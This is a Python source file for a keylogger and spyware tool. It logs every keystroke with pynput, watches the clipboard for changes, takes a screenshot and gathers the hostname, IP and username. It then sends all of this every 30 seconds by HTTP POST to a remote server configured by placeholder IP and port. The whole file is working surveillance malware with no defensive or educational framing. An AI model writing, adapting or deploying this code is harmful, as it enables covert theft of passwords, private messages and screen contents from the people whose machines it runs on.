import json
import threading
import socket
import os
import time
import pyperclip
from pynput import keyboard
from PIL import ImageGrab
import requests

# Global variables
data_buffer = {"keystrokes": [], "screenshot": None, "system_info": None, "clipboard_content": None}
config = {
    "server_ip": "<ip>",
    "server_port": "<port>",
    "send_interval": 30,
    "screenshot_interval": 300,
    "capture_clipboard": True
}

# Load configuration from a file
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return config
    except Exception as e:
        print(f"Error loading config file: {e}")
        return config

# Send data to the server
def send_data_to_server():
    global data_buffer
    try:
        r = requests.post(
            f"http://{config['server_ip']}:{config['server_port']}",
            json=data_buffer,
            headers={"Content-Type": "application/json"}
        )
        r.raise_for_status()  # Raise error if request fails
        data_buffer = {"keystrokes": [], "screenshot": None, "system_info": None, "clipboard_content": None}
    except requests.exceptions.RequestException as e:
        print(f"Failed to send data to server: {e}")

    # Set up the next call to this function
    timer = threading.Timer(config['send_interval'], send_data_to_server)
    timer.daemon = True  # Daemonize the thread
    timer.start()

# Capture screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot.jpg"
        screenshot.save(screenshot_path)
        data_buffer["screenshot"] = screenshot_path
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

# Capture system information
def capture_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = os.getlogin()
        system_info = {
            "hostname": hostname,
            "ip_address": ip_address,
            "username": username
        }
        data_buffer["system_info"] = system_info
    except Exception as e:
        print(f"Error capturing system information: {e}")

# Capture clipboard content changes
def capture_clipboard():
    try:
        previous_clipboard = ""
        while True:
            clipboard_content = pyperclip.paste()
            if clipboard_content != previous_clipboard:
                data_buffer["clipboard_content"] = clipboard_content
                previous_clipboard = clipboard_content
            time.sleep(1)
    except Exception as e:
        print(f"Error capturing clipboard content: {e}")

# Handle key press events
def handle_key_press(key):
    global data_buffer
    try:
        if hasattr(key, 'char'):
            data_buffer["keystrokes"].append(key.char)
        else:
            data_buffer["keystrokes"].append(str(key))
    except Exception as e:
        print(f"Error handling key press: {e}")

# Main function
def main():
    global config
    config = load_config()

    # Start the keyboard listener
    keyboard_listener = keyboard.Listener(on_press=handle_key_press)
    keyboard_listener.start()

    # Start sending data to the server
    send_data_to_server()

    # Start capturing system information
    capture_system_info_thread = threading.Thread(target=capture_system_info)
    capture_system_info_thread.daemon = True
    capture_system_info_thread.start()

    # Start capturing screenshot
    capture_screenshot_thread = threading.Thread(target=capture_screenshot)
    capture_screenshot_thread.daemon = True
    capture_screenshot_thread.start()

    # Start capturing clipboard content
    if config.get("capture_clipboard", False):
        capture_clipboard_thread = threading.Thread(target=capture_clipboard)
        capture_clipboard_thread.daemon = True
        capture_clipboard_thread.start()

    keyboard_listener.join()

if __name__ == "__main__":
    main()
